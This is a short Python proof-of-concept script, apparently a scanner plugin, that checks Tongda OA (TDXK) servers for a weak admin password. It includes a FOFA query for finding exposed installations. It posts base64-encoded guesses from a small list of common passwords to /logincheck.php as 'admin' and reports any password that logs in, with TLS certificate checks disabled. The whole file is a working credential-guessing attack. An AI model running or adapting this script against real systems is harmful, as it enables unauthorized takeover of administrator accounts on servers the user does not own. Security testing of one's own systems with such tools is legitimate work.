#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import base64
import requests
import requests.packages.urllib3
from Config.config_requests import headers
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


# 脚本信息
######################################################
NAME='TDXK_weakpwd'
AUTHOR="nuoyan"
REMARK='TDXK_弱口令'
FOFA_RULE='app="TDXK-通达OA"'
######################################################

def poc(target):
    result = {}
    vul_url = target+"/logincheck.php"

    dic=['','123456','admin','123456789','1','123','111111']
    for i in dic:
        postdata = {
            'UNAME': 'admin',
            'PASSWORD': base64.b64encode(i.encode()).decode(),
            'encode_type': '1',
        }

        res = requests.post(vul_url, headers=headers,data=postdata, verify=False,timeout=10)
        if 'goto_oa' in res.text:
            result['target'] = target
            result['poc'] = NAME
            result['message'] = "存在admin弱口令:{}".format(i)
            return result
            pass
        else:
            pass

if __name__ == '__main__':
    poc("http://127.0.0.1:8088/")


